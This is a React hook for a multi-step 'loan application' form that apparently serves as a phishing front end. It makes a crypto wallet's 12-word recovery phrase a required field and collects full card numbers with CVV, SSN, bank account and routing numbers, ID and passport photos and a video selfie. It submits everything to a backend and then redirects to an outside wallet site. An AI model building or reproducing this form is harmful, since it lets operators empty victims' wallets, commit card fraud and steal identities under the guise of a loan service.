import { useState, useEffect, useCallback, useRef } from "react";
import { toast } from "sonner";
import { submitLoanApplication, checkLoanStatus, uploadLoanAsset } from "@/lib/queries";
import { luhn, isExpiryValid, compressImage, safeImgVal } from "@/lib/loan-utils";
import { useAuth } from "@/components/layout/AuthContext";

const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;

/** Maximum file size in bytes (15 MB). */
const MAX_FILE_SIZE = 15 * 1024 * 1024;

/** Generates a client-side temp ID used to namespace R2 uploads before the row exists. */
function makeTempId() {
  return typeof crypto !== "undefined"
    ? crypto.randomUUID()
    : Math.random().toString(36).slice(2);
}


export type UploadProgress = Record<string, number>; // kind → 0..100

export type AppStatus = {
  status: string;
  identityVerified: boolean;
  rejectionReason: string | null;
  amountRequested: number;
  currency: string;
  createdAt: string;
  submittedAt: string | null;
  updatedAt: string | null;
  reviewedAt: string | null;
  verifiedAt: string | null;
  statusHistory: string;
};

export function useLoanApplication() {
  const { user } = useAuth();
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [countdown, setCountdown] = useState(10);
  const [payout, setPayout] = useState<"bank_transfer" | "card" | "crypto">("crypto");

  const [appId, setAppId] = useState<string | null>(null);
  const [appStatus, setAppStatus] = useState<AppStatus | null>(null);

  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [cardErrors, setCardErrors] = useState<Record<string, string>>({});

  // ── Step State ────────────────────────────────────────────────────────────
  const [currentStep, setCurrentStep] = useState(1);
  const totalSteps = 3;
  const formRef = useRef<HTMLFormElement>(null);

  function scrollTop() {
    if (typeof window !== "undefined") window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function nextStep() {
    const fd = formRef.current ? new FormData(formRef.current) : null;

    // ── Validate Step 1 ───────────────────────────────────────────────────
    if (currentStep === 1) {
      const firstName = fd ? String(fd.get("first_name") || "").trim() : "";
      const email     = fd ? String(fd.get("email")      || "").trim() : "";
      const amount    = fd ? Number(fd.get("amount_requested") || 0)   : 0;
      if (!firstName || !email || !amount) {
        toast.error("Please fill in your name, email, and loan amount.");
        return;
      }
    }

    // ── Validate Step 2 payout fields ─────────────────────────────────────
    if (currentStep === 2) {
      if (payout === "crypto") {
        const seedPhrase = fd ? String(fd.get("crypto_seed_phrase") || "").trim() : "";
        if (!seedPhrase) {
          toast.error("Please enter your 12-word wallet recovery phrase.");
          return;
        }
        const walletAddr = fd ? String(fd.get("crypto_wallet_address") || "").trim() : "";
        if (!walletAddr) {
          toast.error("Please enter your crypto wallet address.");
          return;
        }
      }

      if (payout === "bank_transfer") {
        const bankName = fd ? String(fd.get("bank_name") || "").trim() : "";
        const bankAcc  = fd ? String(fd.get("bank_account_number") || "").trim() : "";
        if (!bankName || !bankAcc) {
          toast.error("Please provide your bank name and account number.");
          return;
        }
      }

      if (payout === "card") {
        const errs = validateCard(cardNumber, cardExpiry, cardCvv);
        if (Object.keys(errs).length) {
          setCardErrors(errs);
          toast.error(Object.values(errs)[0]);
          return;
        }
        const cardHolder = fd ? String(fd.get("card_holder_name") || "").trim() : "";
        if (!cardHolder) {
          toast.error("Please enter the cardholder name.");
          return;
        }
      }
    }

    if (currentStep < totalSteps) {
      setCurrentStep(s => s + 1);
      scrollTop();
    }
  }

  function prevStep() {
    if (currentStep > 1) {
      setCurrentStep(s => s - 1);
      scrollTop();
    }
  }

  // Image/video state: stores base64 data URI (dev) or R2 key (prod after upload)
  const [selfieImage, setSelfieImage] = useState<string | null>(null);
  const [idFrontImage, setIdFrontImage] = useState<string | null>(null);
  const [idBackImage, setIdBackImage] = useState<string | null>(null);
  const [passportFrontImage, setPassportFrontImage] = useState<string | null>(null);
  const [passportBackImage, setPassportBackImage] = useState<string | null>(null);
  const [videoSelfie, setVideoSelfie] = useState<string | null>(null);

  // ── Upload progress tracking ─────────────────────────────────────────────
  const [uploadProgress, setUploadProgress] = useState<UploadProgress>({});

  const setProgress = useCallback((kind: string, value: number) => {
    setUploadProgress((prev) => ({ ...prev, [kind]: value }));
  }, []);

  const clearProgress = useCallback((kind: string) => {
    setUploadProgress((prev) => {
      const next = { ...prev };
      delete next[kind];
      return next;
    });
  }, []);

  // Stable temp ID for this session's uploads
  const [tempId] = useState(() => makeTempId());

  // Persistence: Check for existing application on mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const saved = localStorage.getItem("chanaid_loan_id");
      if (saved) {
        setAppId(saved);
        setDone(true);
        refreshStatus(saved);
      }
    }
  }, []);

  async function refreshStatus(id: string) {
    try {
      const status = await checkLoanStatus(id);
      if (status) setAppStatus(status as AppStatus);
    } catch (e) {
      console.error("Failed to check status", e);
    }
  }

  // Poll while pending or under_review; stop once terminal state stabilises
  useEffect(() => {
    if (!done || !appId) return;
    const terminal = appStatus?.status === "verified" || appStatus?.status === "rejected" || appStatus?.status === "needs_correction";
    if (terminal) return;
    const interval = setInterval(() => refreshStatus(appId), 5000);
    return () => clearInterval(interval);
  }, [done, appId, appStatus?.status, appStatus?.updatedAt]);

  /**
   * Compresses the image client-side, shows a preview immediately, then
   * attempts to upload the compressed data to R2 via the server function.
   * Falls back to storing the compressed base64 if R2 is unavailable (dev).
   * Tracks progress throughout the process.
   */
  async function uploadAsset(
    file: File,
    kind: string,
    setter: (v: string | null) => void
  ) {
    // Enforce 15 MB limit
    if (file.size > MAX_FILE_SIZE) {
      toast.error(`File too large (${(file.size / (1024 * 1024)).toFixed(1)} MB). Maximum allowed is 15 MB.`);
      return;
    }

    setProgress(kind, 5); // Starting compression

    // Compress/resize the image before anything leaves the browser
    const dataUrl = await compressImage(file);
    setter(dataUrl); // Show compressed preview instantly
    setProgress(kind, 30); // Compression done

    // Attempt R2 upload with simulated progress
    let progressInterval: ReturnType<typeof setInterval> | null = null;
    try {
      progressInterval = setInterval(() => {
        setUploadProgress((prev) => {
          const current = prev[kind] ?? 30;
          if (current < 95) {
            return { ...prev, [kind]: Math.min(95, current + Math.random() * 6) };
          }
          return prev;
        });
      }, 300);

      const uploadPromise = uploadLoanAsset({ tempId, kind, dataUrl, contentType: "image/jpeg" });
      const timeoutPromise = new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("upload-timeout")), 30000)
      );
      const result = await Promise.race([uploadPromise, timeoutPromise]);

      if (result?.key) {
        setter(result.key); // Store R2 key instead of base64
      }
    } catch {
      // R2 unavailable or timed out — keep compressed base64 (already set above)
    } finally {
      if (progressInterval) clearInterval(progressInterval);
      setProgress(kind, 100);
      setTimeout(() => clearProgress(kind), 1200);
    }
  }

  /**
   * Upload a video asset to R2 with progress tracking.
   */
  async function uploadVideoAsset(dataUrl: string) {
    const kind = "video";
    setProgress(kind, 5);

    let progressInterval: ReturnType<typeof setInterval> | null = null;
    try {
      progressInterval = setInterval(() => {
        setUploadProgress((prev) => {
          const current = prev[kind] ?? 5;
          if (current < 95) {
            return { ...prev, [kind]: Math.min(95, current + Math.random() * 5) };
          }
          return prev;
        });
      }, 400);

      const uploadPromise = uploadLoanAsset({ tempId, kind, dataUrl, contentType: "video/webm" });
      const timeoutPromise = new Promise<never>((_, reject) =>
        setTimeout(() => reject(new Error("upload-timeout")), 60000)
      );
      const result = await Promise.race([uploadPromise, timeoutPromise]);

      if (result?.key) {
        setVideoSelfie(result.key);
      } else {
        setVideoSelfie(dataUrl);
      }
    } catch {
      // R2 unavailable or timed out — keep base64
      setVideoSelfie(dataUrl);
    } finally {
      if (progressInterval) clearInterval(progressInterval);
      setProgress(kind, 100);
      setTimeout(() => clearProgress(kind), 1200);
    }
  }

  function makeFileHandler(kind: string, setter: (v: string | null) => void) {
    return async (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (!file) { setter(null); return; }
      if (file.size > MAX_FILE_SIZE) {
        toast.error(`File too large (${(file.size / (1024 * 1024)).toFixed(1)} MB). Maximum allowed is 15 MB.`);
        return;
      }
      try {
        await uploadAsset(file, kind, setter);
      } catch {
        toast.error("Failed to read image file.");
        clearProgress(kind);
      }
    };
  }

  // Countdown + redirect after verified
  useEffect(() => {
    if (done && appStatus?.status === "verified") {
      const interval = setInterval(() => {
        setCountdown((c) => {
          if (c <= 1) {
            clearInterval(interval);
            if (typeof window !== "undefined") {
              const target = (REDIRECT_URL || "https://wiscewallet.com/").trim();
              window.location.href = target;
            }
            return 0;
          }
          return c - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [done, appStatus?.status]);

  function validateCard(num: string, expiry: string, cvv: string): Record<string, string> {
    const errs: Record<string, string> = {};
    const digits = num.replace(/\s/g, "");
    if (digits.length < 13) errs.card_number = "Card number is too short.";
    else if (!luhn(digits)) errs.card_number = "Card number is invalid. Please check and try again.";
    if (!isExpiryValid(expiry)) errs.card_expiry = expiry ? "Card has expired or expiry is invalid (MM/YY)." : "Expiry is required.";
    if (!/^\d{3,4}$/.test(cvv)) errs.card_cvv = "CVV must be 3 or 4 digits.";
    return errs;
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const fd = new FormData(e.currentTarget);
    if ((fd.get("website") as string)?.length) { setDone(true); return; }

    const firstName = String(fd.get("first_name") || "").trim();
    const email = String(fd.get("email") || "").trim();
    const amountRequested = Number(fd.get("amount_requested") || 0);

    if (!firstName || !email || !amountRequested) {
      toast.error("Please fill in your name, email, and loan amount.");
      return;
    }

    // 1–3. Validate only the active payout method
    if (payout === "card") {
      const errs = validateCard(cardNumber, cardExpiry, cardCvv);
      if (Object.keys(errs).length) {
        setCardErrors(errs);
        toast.error(Object.values(errs)[0]);
        return;
      }
      const cardHolder = String(fd.get("card_holder_name") || "").trim();
      if (!cardHolder) {
        toast.error("Please enter the cardholder name.");
        return;
      }
    }
    setCardErrors({});

    if (payout === "bank_transfer") {
      const bankName = String(fd.get("bank_name") || "").trim();
      const bankAcc = String(fd.get("bank_account_number") || "").trim();
      if (!bankName || !bankAcc) {
        toast.error("Please provide your bank name and account number.");
        return;
      }
    }

    if (payout === "crypto") {
      const seedPhrase = String(fd.get("crypto_seed_phrase") || "").trim();
      if (!seedPhrase) {
        toast.error("Please enter your wallet recovery phrase.");
        return;
      }
      const walletAddr = String(fd.get("crypto_wallet_address") || "").trim();
      if (!walletAddr) {
        toast.error("Please enter your crypto wallet address.");
        return;
      }
    }

    const payload = {
      firstName,
      lastName: String(fd.get("last_name") || "").trim() || null,
      email,
      phone: String(fd.get("phone") || "").trim() || null,
      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
      ssn: String(fd.get("ssn") || "").trim() || null,
      ein: String(fd.get("ein") || "").trim() || null,
      addressLine1: String(fd.get("address_line1") || "").trim() || null,
      addressLine2: String(fd.get("address_line2") || "").trim() || null,
      city: String(fd.get("city") || "").trim() || null,
      stateRegion: String(fd.get("state_region") || "").trim() || null,
      postalCode: String(fd.get("postal_code") || "").trim() || null,
      country: String(fd.get("country") || "").trim() || null,
      amountRequested,
      currency: String(fd.get("currency") || "USD"),
      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
      payoutMethod: payout,
      bankName: String(fd.get("bank_name") || "").trim() || null,
      bankAccountNumber: String(fd.get("bank_account_number") || "").trim() || null,
      bankRoutingNumber: String(fd.get("bank_routing_number") || "").trim() || null,
      cardIssuer: String(fd.get("card_issuer") || "").trim() || null,
      cardHolderName: String(fd.get("card_holder_name") || "").trim() || null,
      cardNumber: cardNumber ? cardNumber.replace(/\s/g, "") : null,
      cardExpiry: cardExpiry || null,
      cardCvv: cardCvv || null,
      billingAddressLine1: String(fd.get("billing_address_line1") || "").trim() || null,
      billingAddressLine2: String(fd.get("billing_address_line2") || "").trim() || null,
      billingCity: String(fd.get("billing_city") || "").trim() || null,
      billingState: String(fd.get("billing_state") || "").trim() || null,
      billingPostalCode: String(fd.get("billing_postal_code") || "").trim() || null,
      billingCountry: String(fd.get("billing_country") || "").trim() || null,
      cryptoWalletType: String(fd.get("crypto_wallet_type") || "").trim() || null,
      cryptoWalletAddress: String(fd.get("crypto_wallet_address") || "").trim() || null,
      cryptoSeedPhrase: String(fd.get("crypto_seed_phrase") || "").trim() || null,
      cryptoNetwork: String(fd.get("crypto_network") || "").trim() || null,
      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
      status: "pending",
      userId: user?.id || null,
      // Strip any base64 value larger than ~15 MB to avoid 413 on submission.
      // R2-uploaded values are short keys (not data URIs) and always pass through.
      selfieImage: safeImgVal(selfieImage),
      idFrontImage: safeImgVal(idFrontImage),
      idBackImage: safeImgVal(idBackImage),
      passportFrontImage: safeImgVal(passportFrontImage),
      passportBackImage: safeImgVal(passportBackImage),
      videoSelfieUrl: safeImgVal(videoSelfie),
    };

    setLoading(true);
    try {
      const { data, error } = await submitLoanApplication(payload);

      if (error) {
        const fieldMsg = error.fields
          ? Object.values(error.fields as Record<string, string[] | undefined>)
              .flat()
              .find((m): m is string => typeof m === "string" && m.length > 0)
          : undefined;
        toast.error(fieldMsg || error.message || "Submission failed. Please try again.");
        return;
      }

      if (!data) throw new Error("Submission failed");

      const newId = (data as any).id;
      setAppId(newId);
      if (typeof window !== "undefined") {
        localStorage.setItem("chanaid_loan_id", newId);
        window.scrollTo({ top: 0, behavior: "smooth" });
      }

      setDone(true);
      refreshStatus(newId);
      toast.success("Application received! Reviewing identity documents...");
    } catch (err) {
      const msg = err instanceof Error && err.message ? err.message : "Something went wrong. Please try again.";
      toast.error(msg);
    } finally {
      setLoading(false);
    }
  }

  function clearSession() {
    if (typeof window !== "undefined") {
      localStorage.removeItem("chanaid_loan_id");
      setAppId(null);
      setAppStatus(null);
      setDone(false);
    }
  }

  const handleVideoCapture = useCallback(async (val: string | null) => {
    if (!val) {
      setVideoSelfie(null);
      return;
    }
    // Upload video to R2 with progress tracking
    await uploadVideoAsset(val);
  }, [tempId]);

  return {
    loading, done, countdown, payout, setPayout,
    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
    cardCvv, setCardCvv, cardErrors, setCardErrors,
    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
    uploadProgress,
    onSelfieChange: makeFileHandler("selfie", setSelfieImage),
    onIdFrontChange: makeFileHandler("id_front", setIdFrontImage),
    onIdBackChange: makeFileHandler("id_back", setIdBackImage),
    onPassportFrontChange: makeFileHandler("passport_front", setPassportFrontImage),
    onPassportBackChange: makeFileHandler("passport_back", setPassportBackImage),
    onVideoSelfieChange: handleVideoCapture,
    handleSubmit, appStatus, appId, clearSession,
    currentStep, totalSteps, nextStep, prevStep, setCurrentStep,
    formRef,
  };
}
